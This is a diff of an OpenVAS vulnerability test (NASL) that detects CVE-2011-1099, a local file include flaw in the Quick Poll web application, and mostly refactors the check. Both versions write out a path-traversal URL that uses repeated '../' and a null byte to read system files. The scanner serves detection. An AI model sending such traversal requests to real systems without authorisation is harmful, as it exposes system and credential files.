@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_quick_polls_46770.nasl 5646 2017-03-21 09:37:44Z cfi $
+# $Id: gb_quick_polls_46770.nasl 5719 2017-03-24 13:29:29Z cfi $
 #
 # Quick Poll Local File Include and Arbitrary File Deletion Vulnerabilities
 #
@@ -45,23 +45,19 @@ tag_solution = "Vendor patch is available. Please see the reference for details.
 if (description)
 {
  script_id(103110);
- script_version("$Revision: 5646 $");
- script_tag(name:"last_modification", value:"$Date: 2017-03-21 10:37:44 +0100 (Tue, 21 Mar 2017) $");
+ script_version("$Revision: 5719 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-24 14:29:29 +0100 (Fri, 24 Mar 2017) $");
  script_tag(name:"creation_date", value:"2011-03-08 14:02:18 +0100 (Tue, 08 Mar 2011)");
  script_bugtraq_id(46770);
  script_tag(name:"cvss_base", value:"5.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:P");
-  script_cve_id("CVE-2011-1099");
-
+ script_cve_id("CVE-2011-1099");
  script_name("Quick Poll Local File Include and Arbitrary File Deletion Vulnerabilities");
-
  script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/46770");
  script_xref(name : "URL" , value : "http://www.focalmedia.net/create_voting_poll.html");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/516873");
  script_xref(name : "URL" , value : "http://www.uncompiled.com/2011/03/quick-polls-local-file-inclusion-deletion-vulnerabilities-cve-2011-1099/");
-
  script_tag(name:"qod_type", value:"remote_vul");
- script_summary("Determine if Quick Poll is prone to a local file-include vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
@@ -74,31 +70,28 @@ if (description)
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
+include("host_details.inc");
    
-port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
-
-if(!can_host_php(port:port))exit(0);
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) ) exit( 0 );
 
 files = traversal_files();
 
-dirs = make_list("/quickpoll",cgi_dirs());
+foreach dir( make_list_unique( "/quickpoll", cgi_dirs( port:port ) ) ) {
 
-foreach dir (dirs) {
-  foreach file (keys(files)) {
-   
-    url = string(dir, "/index.php?fct=preview&p=",crap(data:"../",length:6*9),files[file],"%00"); 
+  if( dir == "/" ) dir = "";
 
-    if(http_vuln_check(port:port, url:url,pattern:file)) {
-     
-      security_message(port:port);
-      exit(0);
+  foreach file( keys( files ) ) {
 
+    url = string(dir, "/index.php?fct=preview&p=",crap(data:"../",length:6*9),files[file],"%00");
+
+    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
   }
 }
-exit(0);
 
+exit( 99 );
